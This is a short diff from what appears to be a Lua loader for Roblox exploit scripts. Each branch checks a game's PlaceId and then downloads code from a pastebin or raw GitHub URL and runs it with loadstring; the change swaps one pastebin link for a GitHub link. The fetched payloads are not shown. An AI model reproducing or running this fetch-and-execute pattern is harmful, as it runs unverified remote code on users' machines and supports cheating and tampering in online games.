@@ -29,7 +29,7 @@ if game.PlaceId == 155615604  then
 end
 
 if game.PlaceId == 855499080  then
-    loadstring(game:HttpGet"https://pastebin.com/raw/mPkXxaaE")()
+    loadstring(game:HttpGet"https://raw.githubusercontent.com/GirafeZerius/noproblem/main/sw")()
 end
 if game.PlaceId == 2377868063  then
     loadstring(game:HttpGet"https://pastebin.com/raw/g8SbaKdX")()
